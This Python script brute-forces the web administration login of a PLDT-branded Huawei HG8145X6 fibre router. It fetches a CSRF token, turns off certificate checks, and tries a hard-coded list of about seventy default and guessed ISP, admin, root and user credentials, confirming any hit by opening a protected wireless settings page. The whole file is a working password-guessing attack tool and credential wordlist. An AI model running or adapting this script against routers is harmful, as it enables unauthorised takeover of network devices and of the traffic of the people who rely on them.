#!/usr/bin/env python3
"""
Try alternative PLDT/Huawei admin credentials found from internet research.
Different from superadmin — these are ISP/technician accounts.
"""
import base64
import re
import ssl
import urllib.request
import urllib.error

ROUTER = "https://192.168.1.1"

ssl_ctx = ssl.create_default_context()
ssl_ctx.check_hostname = False
ssl_ctx.verify_mode = ssl.CERT_NONE


def get_csrf():
    req = urllib.request.Request(
        f"{ROUTER}/asp/GetRandCount.asp",
        method="POST",
        headers={"User-Agent": "Mozilla/5.0"},
    )
    resp = urllib.request.urlopen(req, context=ssl_ctx, timeout=8)
    return resp.read().decode("utf-8", errors="replace").strip().replace("\ufeff", "")


def try_login(username, password, csrf):
    pw_b64 = base64.b64encode(password.encode()).decode()
    data = f"UserName={username}&PassWord={pw_b64}&Language=english&x.X_HW_Token={csrf}"
    req = urllib.request.Request(
        f"{ROUTER}/login.cgi",
        data=data.encode(),
        method="POST",
        headers={
            "User-Agent": "Mozilla/5.0",
            "Content-Type": "application/x-www-form-urlencoded",
        },
    )
    try:
        resp = urllib.request.urlopen(req, context=ssl_ctx, timeout=10)
        body = resp.read().decode("utf-8", errors="replace")
        return body
    except Exception as e:
        return str(e)


def try_protected_page():
    """Check if we can access a protected page (indicates logged in)."""
    req = urllib.request.Request(
        f"{ROUTER}/html/amp/wlanbasic/WlanBasic.asp?2G",
        headers={
            "User-Agent": "Mozilla/5.0",
            "Cookie": "Cookie=body:Language:english:id=-1",
        },
    )
    try:
        resp = urllib.request.urlopen(req, context=ssl_ctx, timeout=8)
        body = resp.read().decode("utf-8", errors="replace")
        if "wlSsid" in body or "WlanBasic" in body or "/wlanbasic/" in resp.url:
            return True
        if "txt_Username" not in body:
            return True
        return False
    except:
        return False


def main():
    print(f"\n{'='*60}")
    print("  Trying alternative PLDT/Huawei credentials")
    print(f"{'='*60}\n")

    csrf = get_csrf()
    print(f"CSRF Token: {csrf[:20]}...")

    # Comprehensive list of PLDT Huawei HG8145X6-10 credentials from internet
    credentials = [
        # telecomadmin account (ISP admin, not superadmin)
        ("telecomadmin", "admintelecom"),
        ("telecomadmin", "1234567890"),
        ("telecomadmin", "Admin1234"),
        ("telecomadmin", "admin"),
        ("telecomadmin", "password"),
        ("telecomadmin", "telecom"),

        # PLDT variant passwords for admin account
        ("admin", "12345678"),
        ("admin", "123456789"),
        ("admin", "1234567890"),
        ("admin", "0123456789"),
        ("admin", "PlDt1234"),
        ("admin", "PLDT1234"),
        ("admin", "pldt1234"),
        ("admin", "PLDTadmin"),
        ("admin", "pldtadmin"),
        ("admin", "pldt123"),
        ("admin", "PLDT123"),
        ("admin", "PLDThome"),
        ("admin", "pldthome"),
        ("admin", "PLDThome123"),
        ("admin", "Fibr1234"),
        ("admin", "fibr1234"),
        ("admin", "FIBER1234"),
        ("admin", "fiber1234"),
        ("admin", "fiberhome"),
        ("admin", "Fiberhome123"),
        ("admin", "PlDTHomeFibr"),
        ("admin", "PLDTHomeFibr"),
        ("admin", "pldthomefibr"),
        ("admin", "1234Admin"),
        ("admin", "Admin@123"),
        ("admin", "admin@123"),
        ("admin", "Admin#123"),
        ("admin", "P@ssw0rd"),
        ("admin", "p@ssw0rd"),
        ("admin", "Huawei@123"),
        ("admin", "huawei123"),
        ("admin", "HUAWEI123"),
        ("admin", "HG8145X6"),
        ("admin", "hg8145x6"),
        ("admin", "PLDT12345"),
        ("admin", "pldt12345"),
        ("admin", "Home1234"),
        ("admin", "home1234"),
        ("admin", "PLDTHome"),
        ("admin", "pldthomefiber"),
        ("admin", "PLDTHomeFiber"),
        ("admin", "1234567P"),
        ("admin", "PLDThome1"),
        ("admin", "pldthome1"),
        ("admin", "Pldt1234"),
        ("admin", "PLdt1234"),
        ("admin", "Pldt@1234"),
        ("admin", "PLDT@1234"),
        ("admin", "pldt@1234"),

        # root account
        ("root", "adminHW"),
        ("root", "adminhw"),
        ("root", "root"),
        ("root", "root123"),
        ("root", "Huawei123"),

        # user account
        ("user", "user"),
        ("user", "user123"),
        ("user", "password"),
    ]

    print(f"\nTesting {len(credentials)} credential pairs...\n")

    for i, (user, pwd) in enumerate(credentials, 1):
        try:
            body = try_login(user, pwd, csrf)
            if "WlanBasic" in body or "wlan" in body.lower():
                print(f"  [{i:3d}] *** FOUND: {user}:{pwd} ***")
                print(f"        Login response indicates successful auth!")
                continue
            if "Waiting" in body or "location.replace" in body:
                # Need to verify — check if we can access protected page
                if try_protected_page():
                    print(f"  [{i:3d}] *** FOUND: {user}:{pwd} ***")
                    print(f"        Verified via protected page access!")
                    continue

            # Count "failed" indicators
            if "Incorrect" in body or "loginfail" in body.lower() or "failure" in body.lower():
                pass  # Expected
            else:
                print(f"  [{i:3d}] Ambiguous: {user}:{pwd} (response: {body[:80]})")

        except Exception as e:
            print(f"  [{i:3d}] Error: {user}:{pwd} — {e}")

        if i % 10 == 0:
            print(f"  ... tested {i}/{len(credentials)} ...")

    print(f"\n{'='*60}")
    print("  Done.")
    print(f"{'='*60}\n")


if __name__ == "__main__":
    main()
